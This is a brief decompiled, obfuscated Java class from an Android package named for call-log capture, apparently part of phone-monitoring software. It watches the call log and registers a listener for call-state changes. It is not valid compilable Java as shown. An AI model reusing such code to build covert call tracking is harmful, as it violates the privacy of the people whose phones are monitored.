package com.vvt.capture.calllog.b;

import android.content.Context;
import android.database.ContentObserver;
import android.os.Handler;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

class d
  extends ContentObserver
{
  d(c paramc, Handler paramHandler)
  {
    super(paramHandler);
  }
  
  public void onChange(boolean paramBoolean)
  {
    Object localObject1 = this.a.a;
    Object localObject2 = new com/vvt/capture/calllog/b/e;
    b localb = this.a.a;
    ((e)localObject2).<init>(localb, null);
    b.a((b)localObject1, (e)localObject2);
    localObject2 = this.a.a;
    localObject1 = (TelephonyManager)b.a(this.a.a).getSystemService("phone");
    b.a((b)localObject2, (TelephonyManager)localObject1);
    localObject1 = b.c(this.a.a);
    localObject2 = b.b(this.a.a);
    ((TelephonyManager)localObject1).listen((PhoneStateListener)localObject2, 32);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/calllog/removeFromPath/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */